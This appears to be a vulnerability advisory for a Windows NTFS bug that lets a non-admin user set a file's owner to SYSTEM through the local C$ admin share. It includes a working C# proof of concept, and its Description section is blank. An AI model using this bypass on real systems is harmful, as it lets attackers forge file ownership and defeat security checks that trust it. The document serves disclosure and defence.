Windows: NTFS Owner/Mandatory Label Privilege Bypass EoP
Platform: Windows 10 1709 not tested 8.1 Update 2 or Windows 7
Class: Elevation of Privilege
 
Summary:
When creating a new file on an NTFS drive it’s possible to circumvent security checks for setting an arbitrary owner and mandatory label leading to a non-admin user setting those parts of the security descriptor with non-standard values which could result in further attacks resulting EoP.
 
Description:
 
 
 
 
Is this useful? Almost certainly there’s some applications out there which use the Owner or Label as an indicator that only an administrator could have created the file (even if that’s not a very good security check). For example VirtualBox uses it as part of its security checks for whether a DLL is allowed to be loaded in process (see my blog about it https://googleprojectzero.blogspot.com.au/2017/08/bypassing-virtualbox-process-hardening.html) so I could imagine other examples including Microsoft products. Another example is process creation where the kernel checks the file's label to determine if it needs to drop the IL on the new process, I don't think you can increase the IL but maybe there's a way of doing so.
 
Based on the implementation this looks like it would also bypass the checks for setting the SACL, however due to the requirement for an explicit access right this is blocked earlier in the call through the SMBv2 client. I’ve not checked if using an alternative SMBv2 client implementation such as SAMBA would allow you to bypass this restriction or whether it’s still blocked in the server code.
 
 
Proof of Concept:
 
I’ve provided a PoC as a C# source code file. You need to compile it first. It will attempt to create two files with a Security Descriptor with the Owner set to SYSTEM. 
 
1) Compile the C# source code file.
2) Execute the PoC as a normal user or at least a filtered split-token admin user.
 
Expected Result:
Both file creations should fail with the same error when setting the owner ID.
 
Observed Result:
The first file which is created directly fails with an error setting the owner ID. The second file which is created via the C$ admin share on the local SMB server succeeds and if the SD is checked the owner is indeed set to SYSTEM.
*/
 
using System;
using System.IO;
using System.Security.AccessControl;
 
namespace NtfsSetOwner_EoP
{
    class Program
    {
        static void CreateFileWithOwner(string path)
        {
            try
            {
                FileSecurity sd = new FileSecurity();
                sd.SetSecurityDescriptorSddlForm("O:SYG:SYD:(A;;GA;;;WD)");
                using (var file = File.Create(path, 1024, FileOptions.None, sd))
                {
                    Console.WriteLine("Created file {0}", path);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error creating file {0} with arbitrary owner", path);
                Console.WriteLine(ex.Message);
            }
        }
 
        static void Main(string[] args)
        {
            try
            {
                Directory.CreateDirectory(@"c:\test");
                CreateFileWithOwner(@"c:\test\test1.txt");
                CreateFileWithOwner(@"\\localhost\c$\test\test2.txt");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}

